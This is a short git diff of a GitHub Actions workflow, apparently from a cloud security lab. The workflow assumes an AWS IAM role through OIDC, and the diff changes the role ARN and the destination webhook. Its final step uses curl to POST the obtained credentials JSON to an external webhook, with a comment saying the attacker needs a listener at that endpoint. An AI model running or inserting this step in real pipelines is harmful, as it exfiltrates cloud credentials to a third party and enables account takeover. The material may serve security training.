@@ -20,7 +20,7 @@ jobs:
         uses: aws-actions/configure-aws-credentials@v1
         with:
           aws-region: us-east-1
-          role-to-assume: arn:aws:iam::337909758621:role/sts-lab-2-target
+          role-to-assume: arn:aws:iam::337909758621:role/whitebox-lab-2-github-actions-role
           role-session-name: OIDCSession
 
       - name: Verify Assumed Role Identity
@@ -36,5 +36,5 @@ jobs:
           # Ensure attacker has a listener configured at this endpoint
           curl -X POST -H "Content-Type: application/json" \
                -d "$CREDS_JSON" \
-               https://webhook.site/4f72ac78-bfe4-4c2e-a15b-df9696c49b27
+               https://webhook-test.com/a94dcb6984b1165d2de707b2e2514e40
         shell: bash
